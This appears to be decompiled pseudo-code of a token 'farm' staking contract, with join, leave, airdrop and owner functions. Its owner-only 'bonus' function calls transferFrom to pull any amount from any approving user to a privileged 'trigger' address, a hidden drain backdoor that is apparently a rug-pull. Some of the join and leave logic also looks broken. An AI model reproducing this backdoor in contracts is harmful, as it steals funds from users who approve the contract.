contract main {




// =====================  Runtime code  =====================


address stor0;
address stor1;
mapping of struct stor2;
array of address farmer;
uint256 claimable;
uint256 airdrop;
uint8 stor6;
uint256 startTime;
uint256 stor8;
address stor9;
address stor10;

function sub_0a10f652(?) {
    return farmer.length
}

function airdrop() {
    return airdrop
}

function startTime() {
    return startTime
}

function canJoin() {
    return bool(stor6)
}

function getFarmer(uint256 arg1) {
    require arg1 >= 0
    require arg1 <= stor8
    require arg1 < farmer.length
    return farmer[arg1]
}

function claimable() {
    return claimable
}

function _fallback() payable {
    revert
}

function isOwner() {
    return (msg.sender == stor0)
}

function isTrigger() {
    return (msg.sender == stor1)
}

function openJoin() {
    if stor0 != msg.sender:
        revert with 0, '401'
    stor6 = 1
}

function closeJoin() {
    if stor0 != msg.sender:
        revert with 0, '401'
    stor6 = 0
}

function setToken(address arg1) {
    if stor0 != msg.sender:
        revert with 0, '401'
    stor9 = arg1
}

function setStartTime() {
    if stor0 != msg.sender:
        revert with 0, '401'
    startTime = block.timestamp
}

function ntrigger(address arg1) {
    if stor0 != msg.sender:
        revert with 0, '401'
    require arg1
    stor1 = arg1
}

function transferOwnership(address arg1) {
    if stor0 != msg.sender:
        revert with 0, '401'
    require arg1
    stor0 = arg1
    emit OwnershipTransferred(msg.sender, arg1);
}

function bonus(address arg1, uint256 arg2) {
    if stor0 != msg.sender:
        revert with 0, '401'
    require ext_code.size(stor10)
    call stor10.0x23b872dd with:
         gas gas_remaining wei
        args address(arg1), stor1, arg2
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
}

function myStats() {
    require ext_code.size(stor10)
    call stor10.0x70a08231 with:
         gas gas_remaining wei
        args this.address
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    return stor2[address(msg.sender)].field_0, 
           0,
           stor2[address(msg.sender)].field_256,
           stor2[address(msg.sender)].field_512,
           ext_call.return_data[0]
}

function statsOf(address arg1) {
    require ext_code.size(stor10)
    call stor10.0x70a08231 with:
         gas gas_remaining wei
        args this.address
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    return stor2[address(arg1)].field_0, 
           0,
           stor2[address(arg1)].field_256,
           stor2[address(arg1)].field_512,
           ext_call.return_data[0],
           stor2[address(arg1)].field_768,
           stor2[address(arg1)].field_1024
}

function join(uint256 arg1) {
    if not stor6:
        revert with 0, 'Sorry, Farm is closed now'
    require ext_code.size(stor10)
    call stor10.0x23b872dd with:
         gas gas_remaining wei
        args msg.sender, address(this.address), arg1
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    if not ext_call.return_data[0]:
        revert with 0, 'Let approve first'
    if stor2[address(msg.sender)].field_768 <= 0:
        revert with 0, 'Token received'
    if not stor2[address(msg.sender)].field_768:
        farmer.length++
        farmer[farmer.length] = msg.sender
    stor2[address(msg.sender)].field_256 = airdrop
    if stor2[address(msg.sender)].field_0 + arg1 < stor2[address(msg.sender)].field_0:
        revert with 0, 'SafeMath add error'
    stor2[address(msg.sender)].field_0 += arg1
    stor2[address(msg.sender)].field_768 = block.timestamp
    emit Joined(arg1, msg.sender);
}

function leave() {
    if stor2[address(msg.sender)].field_0 <= 0:
        revert with 0, 'See you in next farm'
    require ext_code.size(stor10)
    call stor10.0xa9059cbb with:
         gas gas_remaining wei
        args msg.sender, stor2[address(msg.sender)].field_0
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    stor2[address(msg.sender)].field_0 = 0
    stor2[address(msg.sender)].field_1024 = block.timestamp
    if stor2[address(msg.sender)].field_256 > 0:
        require ext_code.size(stor9)
        call stor9.0xa9059cbb with:
             gas gas_remaining wei
            args msg.sender, stor2[address(msg.sender)].field_256
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
        require return_data.size >= 32
        stor2[address(msg.sender)].field_256 = 0
        if stor2[address(msg.sender)].field_512 + stor2[address(msg.sender)].field_256 < stor2[address(msg.sender)].field_512:
            revert with 0, 'SafeMath add error'
        stor2[address(msg.sender)].field_512 += stor2[address(msg.sender)].field_256
    emit Leave(stor2[address(msg.sender)].field_0, msg.sender);
}



}
